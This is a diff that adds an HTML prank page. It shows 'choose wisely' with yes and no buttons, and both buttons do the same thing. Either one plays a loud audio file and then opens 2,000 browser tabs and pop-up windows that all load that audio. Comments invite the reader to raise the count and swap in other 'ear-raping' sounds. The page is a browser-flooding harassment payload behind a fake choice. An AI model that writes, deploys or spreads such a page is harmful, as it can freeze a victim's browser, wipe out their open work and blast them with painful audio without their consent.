@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            flex-direction: column;
+        }
+        h1 {
+            font-size: 2rem;
+            color: white;
+            text-shadow: 0 0 4px #fff, 0 0 8px #fff;
+            margin-bottom: 30px;
+        }
+        .main-container {
+            display: flex;
+            gap: -10px;
+        }
+        .main {
+            font-size: 1rem;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+        }
+        .yes {
+            color: #00ff00;
+            text-shadow: 0 0 3px #00ff00, 0 0 6px #00ff00;
+        }
+        .no {
+            color: #ff0000;
+            text-shadow: 0 0 3px #ff0000, 0 0 6px #ff0000;
+        }
+    </style>
+    <script>
+        const audio = new Audio('https://files.catbox.moe/wce0wl.mp3'); // change the audio if u want to sum diff
+
+        function exe() {
+            const url = "https://files.catbox.moe/wce0wl.mp3";
+            for (let i = 0; i < 1000; i++) { // change this to the amount of times u want a new page with a ear-raping sound show up
+                window.open(url, '_blank');
+            }
+            for (let i = 0; i < 1000; i++) { // change this to the amount of times u want a new pop-up with a ear-raping sound show up
+                window.open(url, '_blank', 'width=400,height=400');
+            }
+        }
+
+        function clicky() {
+            audio.play();
+            exe();
+        }
+
+        function clickn() {
+            audio.play();
+            exe();
+        }
+    </script>
+</head>
+<body>
+    <h1>choose wisely</h1>
+    <div class="main-container">
+        <div class="main yes" onclick="clicky()">[yes]</div>
+        <div class="main no" onclick="clickn()">[no]</div>
+    </div>
+</body>
+</html>
